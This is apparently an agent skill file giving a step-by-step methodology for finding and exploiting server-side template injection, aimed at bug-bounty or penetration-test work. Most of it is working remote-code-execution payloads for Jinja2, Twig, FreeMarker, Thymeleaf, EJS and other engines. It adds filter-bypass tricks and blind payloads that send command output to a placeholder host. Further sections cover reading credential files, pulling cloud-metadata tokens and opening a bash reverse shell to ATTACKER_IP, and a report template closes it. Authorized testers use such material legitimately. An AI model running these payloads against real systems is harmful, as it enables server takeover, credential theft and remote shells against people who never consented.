---
name: ssti-hunter
description: Complete SSTI detection and exploitation methodology — engine fingerprinting, RCE payloads per engine (Jinja2, Twig, FreeMarker, Velocity, Mako, ERB, EJS, Pebble, Thymeleaf, Smarty, Pug, Handlebars, Nunjucks), sandbox escapes, blind detection, and report structure. Use when a parameter may be evaluated server-side ({{7*7}} returns 49), a stack trace names a template engine, or you're escalating SSTI to RCE.
license: MIT
metadata:
  version: "1.0.0"
  author: AuditGuard
  tags: ["ssti", "rce", "injection", "template", "web"]
---

# SSTI Hunter — Server-Side Template Injection

SSTI occurs when user input is embedded directly into a template and evaluated by the engine. The result is almost always **Remote Code Execution** on the server.

---

## Phase 1 — Find Injection Points

| Surface | Example |
|---|---|
| URL query parameters | `/search?q=Hello` |
| URL path segments | `/greet/John` |
| HTTP headers | `User-Agent`, `Referer`, custom headers |
| Form inputs / POST body | Name, email, message fields |
| Cookies | `username=John`, theme/locale cookies |
| File names | Upload endpoints echoing the original filename |
| Email templates | Name field in password reset emails |
| Profile fields | Display name, bio, job title |

Confirm reflection first: submit a canary string (e.g. `SSTI_TEST_1337`) and verify it appears in the response before probing.

---

## Phase 2 — Detect: Is It Vulnerable?

Send each probe — look for the **evaluated result**, not the literal string:

```
{{7*7}}          → 49
${7*7}           → 49
<%= 7*7 %>       → 49
#{7*7}           → 49
*{7*7}           → 49
{{7*'7'}}        → 49 or 7777777  (engine-differentiating)
```

- **Evaluated result** → confirmed SSTI
- **Literal string reflected** → not injectable (or filtered)
- **500 error** → still injectable; note the stack trace — it usually names the engine

Error-trigger probes:
```
{{          → Jinja2/Twig unclosed tag
${          → FreeMarker/Velocity/Mako unclosed expression
<#assign x= → FreeMarker syntax error
@{1+1}      → Thymeleaf expression error
```

---

## Phase 3 — Fingerprint: Which Engine?

```
Start: submit {{7*7}}
│
├─ Returns 49
│   ├─ {{7*'7'}} → 7777777   →  Jinja2  (Python)
│   ├─ {{7*'7'}} → 49        →  Twig    (PHP)
│   └─ {{dump(1)}} returns   →  Smarty  (PHP) — also try {7*7}
│
├─ {{ fails but ${7*7} → 49
│   ├─ Java stack trace
│   │   ├─ "FreeMarker"      →  FreeMarker (Java)
│   │   ├─ "Velocity"        →  Velocity   (Java)
│   │   ├─ "Pebble"          →  Pebble     (Java)
│   │   └─ "Thymeleaf"       →  Thymeleaf  (Java) — also try *{7*7}
│   └─ Python stack trace    →  Mako (Python)
│
├─ <%= 7*7 %> → 49
│   ├─ Ruby headers/trace    →  ERB   (Ruby)
│   └─ Node headers/trace    →  EJS   (Node.js)
│
├─ #{7*7} → 49               →  Pug   (Node.js) or Smarty (PHP)
│
└─ *{7*7} or [[${7*7}]] → 49 →  Thymeleaf (Java / Spring)
```

### Engine Reference

| Engine | Language | Framework | Delimiters |
|---|---|---|---|
| Jinja2 | Python | Flask, Django, Ansible | `{{ }}` `{% %}` |
| Twig | PHP | Symfony, WordPress | `{{ }}` `{% %}` |
| Smarty | PHP | Legacy PHP | `{ }` |
| Mako | Python | Pyramid | `${ }` `<% %>` |
| FreeMarker | Java | Spring MVC | `${ }` `<#...>` |
| Velocity | Java | JIRA, Confluence | `$var` `#set` |
| Pebble | Java | Spring | `{{ }}` `{% %}` |
| Thymeleaf | Java | Spring Boot | `*{ }` `[[ ]]` |
| ERB | Ruby | Rails | `<%= %>` `<% %>` |
| EJS | JavaScript | Express | `<%= %>` `<% %>` |
| Pug/Jade | JavaScript | Express | `#{ }` `- code` |
| Handlebars | JavaScript | Express | `{{ }}` |
| Nunjucks | JavaScript | Express | `{{ }}` `{% %}` |

---

## Phase 4 — Exploitation per Engine

Confirmation payloads are in Phase 2/3. Jump straight to RCE.

---

### 4.1 Jinja2 (Python — Flask / Django / Ansible)

```python
# RCE via globals (simplest)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Flask global shortcuts
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via request (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Find Popen dynamically (when index is unknown)
{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'Popen' in cls.__name__ %}
    {{cls(['id'],stdout=-1).communicate()[0].decode()}}
  {% endif %}
{% endfor %}

# File read
{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

---

### 4.2 Twig (PHP — Symfony / WordPress / Craft CMS)

```php
# RCE via filter callback (Twig < 1.20)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# RCE via map/filter (Twig 1.x)
{{["id"]|map("system")|join}}
{{['id']|filter('system')}}
{{[1,2]|sort((a,b)=>system('id'))}}

# File read
{{source('/etc/passwd')}}

# Twig 2.x / 3.x (hardened — abuse attribute function)
{{attribute(loop.body,'include',{template:'/etc/passwd'})}}
```

---

### 4.3 Smarty (PHP — legacy apps)

```php
# RCE — php tag enabled (Smarty 2.x / 3.x)
{php}echo `id`;{/php}

# RCE — static method call
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# RCE — php tag disabled (Smarty 3+)
{math equation="0" format="%1\$s" a=system('id')}
{assign var=a value='id'}{if system($a)}{/if}
```

---

### 4.4 Mako (Python — Pyramid / standalone)

```python
# Expression block
${__import__('os').popen('id').read()}

# Code block
<%
import os
x = os.popen('id').read()
%>
${x}

# Module-level block
<%!
import os
%>
${os.popen('id').read()}
```

---

### 4.5 FreeMarker (Java — Spring MVC / standalone)

```java
# RCE via Execute class
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# RCE via API access (FreeMarker 2.3.22+)
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign runtime=clazz?api.getRuntime()>
<#assign process=runtime?api.exec("id")>
<#assign is=process?api.inputStream>
<#assign br=["java.io.BufferedReader"]?new(["java.io.InputStreamReader"]?new(is))>
${br?api.readLine()}

# File read
<#assign file=["java.io.File"]?new("/etc/passwd")>
<#assign scanner=["java.util.Scanner"]?new(file)>
${scanner.useDelimiter("\\Z").next()}

# Square bracket syntax (alternate delimiters)
[#assign ex="freemarker.template.utility.Execute"?new()][=ex("id")]
```

---

### 4.6 Velocity (Java — JIRA / Confluence / legacy)

```java
# RCE via ClassTool
#set($runtime=$class.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
#set($reader=new java.io.BufferedReader(new java.io.InputStreamReader($process.getInputStream())))
$reader.readLine()

# RCE via VelocityView (VelocityTools)
#set($x=$request.class.forName("java.lang.Runtime"))
#set($rt=$x.getMethod("getRuntime",$x.forName("java.lang.Class")[0]).invoke(null,null))
#set($p=$rt.exec("id"))
#set($reader=new java.io.BufferedReader(new java.io.InputStreamReader($p.inputStream)))
$reader.readLine()
```

---

### 4.7 Pebble (Java — Spring / standalone)

```java
{% set rt = "".__class__.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null) %}
{% set cmd = rt.exec("id") %}
{% set is = cmd.inputStream %}
{% set isr = "".__class__.forName("java.io.InputStreamReader").__constructor__(is).newInstance(is) %}
{% set br = "".__class__.forName("java.io.BufferedReader").__constructor__(isr).newInstance(isr) %}
{{ br.readLine() }}
```

---

### 4.8 Thymeleaf (Java — Spring Boot)

Thymeleaf SSTI usually appears in **Spring MVC path variables mapped to template names**: `return "user/" + userInput;`

```java
# Detect (SpEL inline expressions)
*{7*7}
[[${7*7}]]

# RCE via T() SpEL operator
*{T(java.lang.Runtime).getRuntime().exec('id')}

# RCE with output capture via ProcessBuilder
*{new java.util.Scanner(
    new java.lang.ProcessBuilder(new String[]{"id"}).start().getInputStream()
).useDelimiter("\\A").next()}

# File read
*{new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter("\\A").next()}

# Environment dump
*{T(java.lang.System).getenv()}
```

---

### 4.9 ERB (Ruby — Rails)

```ruby
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.read('/etc/passwd') %>
```

---

### 4.10 EJS (JavaScript — Express / Node.js)

```javascript
<%= require('child_process').execSync('id').toString() %>
<%= require('fs').readFileSync('/etc/passwd','utf8') %>

// EJS options injection (when options object is user-controlled)
{"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}
```

---

### 4.11 Pug / Jade (JavaScript — Express / Node.js)

```jade
- var x = require('child_process').execSync('id').toString()
= x

- var f = require('fs').readFileSync('/etc/passwd','utf8')
= f
```

---

### 4.12 Handlebars (JavaScript — Express / standalone)

Handlebars is logic-less — RCE requires prototype pollution (< 4.7.7):

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

### 4.13 Nunjucks (JavaScript — Express / Mozilla)

```javascript
// Via constructor chain
{{"test".constructor.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}

// Via range global
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

---

## Phase 5 — Bypass Techniques

### 5.1 String Concatenation

```python
# Jinja2 — split blocked keywords
{{''.__class__['__m'+'ro__']}}
{{config['__class__']['__init__']['__glob'+'als__']['os']['po'+'pen']('id').read()}}
```

### 5.2 Encoding Bypasses

```
%7B%7B7*7%7D%7D          URL-encoded {{7*7}}
%257B%257B7*7%257D%257D  Double URL-encoded
&#123;&#123;7*7&#125;&#125;  HTML entities
｛｛7*7｝｝               Fullwidth braces (Unicode normalization)
```

### 5.3 Alternate Attribute Access (Jinja2)

```python
obj.attr         →  obj['attr']  or  obj|attr('attr')
''.__class__     →  ''['\x5f\x5fclass\x5f\x5f']
# Full encoded bypass (Flask)
{{request|attr('\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### 5.4 Comment Injection

```
# Break naive "{{" WAF detection
{{7{#comment#}*7}}
{{- 7*7 -}}

# FreeMarker square bracket alternate syntax
[=7*7]
[#assign ex="freemarker.template.utility.Execute"?new()][=ex("id")]
```

---

## Phase 6 — Blind SSTI

When output is not reflected (email, PDF, background job):

### Time-Based

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
# ERB
<%= `sleep 5` %>
# EJS
<%= require('child_process').execSync('sleep 5') %>
```

### Out-of-Band (Burp Collaborator / interactsh)

```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('curl http://OOB.URL/?x=$(id|base64)').read()}}
# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://OOB.URL/?x=$(id|base64)")}
# ERB
<%= `curl http://OOB.URL/?x=$(id|base64)` %>
# EJS
<%= require('child_process').execSync('curl http://OOB.URL/?x=$(id|base64)') %>
```

---

## Phase 7 — Escalate Impact

### Sensitive Files

```
/etc/passwd
/etc/shadow               (root only)
/proc/self/environ        (env vars — secrets, API keys)
~/.ssh/id_rsa             (SSH private key)
.env                      (DB creds, API keys)
config/database.yml       (Rails DB credentials)
/app/settings.py          (Django SECRET_KEY, DB)
/var/www/html/wp-config.php
```

### Cloud Metadata (SSRF via RCE)

```bash
# AWS IAM credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# GCP token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Phase 8 — Confirm the Finding

- [ ] Math expression evaluated server-side (not reflected as-is)
- [ ] Engine identified from decision tree
- [ ] RCE payload returned `id`/`whoami` output — OR — blind confirmed via time delay / OOB
- [ ] Reproducible in a fresh session with attacker's own credentials

**False positive checks:**
- `{{7*7}}` displayed literally → not SSTI (template may sanitize or escape output)
- `{{7*7}}` evaluated in the browser → client-side injection (AngularJS), not SSTI

---

## Phase 9 — Report Structure

```
Title: SSTI in [parameter] on [endpoint] — RCE via [Engine Name]

Severity: Critical
CWE: CWE-94 | OWASP: A03:2021 – Injection

Affected endpoint: [METHOD] [URL]
Affected parameter: [name]
Template engine: [Engine + Language]

Steps to reproduce:
1. Send: [exact HTTP request with payload]
2. Observe: response contains [evaluated output]
3. Escalated PoC: [RCE payload] → output: [id command result / OOB callback]

Impact:
- RCE as [process user]
- Full compromise of application secrets and credentials
- Lateral movement to internal network / cloud metadata

Evidence:
- Request / Response snippet showing evaluation
- OOB callback log (for blind SSTI)

Remediation:
- Never render user input as a template string
  UNSAFE: render(user_input)
  SAFE:   render("Hello {{ name }}", {"name": user_input})
- Jinja2: use SandboxedEnvironment
- Twig: enable sandbox extension
- FreeMarker: set TemplateClassResolver.SAFER_RESOLVER
- Input validation alone is insufficient — template syntax is too varied
```

---

## Quick-Reference: Priority Order

1. URL query parameters — fastest, most common
2. Error pages that reflect input — stack trace names the engine
3. Template/theme selection params — `?template=`, `?theme=`, `?lang=`
4. Name/display fields — often rendered in emails or PDFs (blind)
5. Admin / CMS template editors — high privilege, maximum impact

---

## Reference Files

- `references/payloads.md` — Per-engine payload cheatsheet
- `references/tools.md` — tplmap, SSTImap, Burp extensions, Nuclei
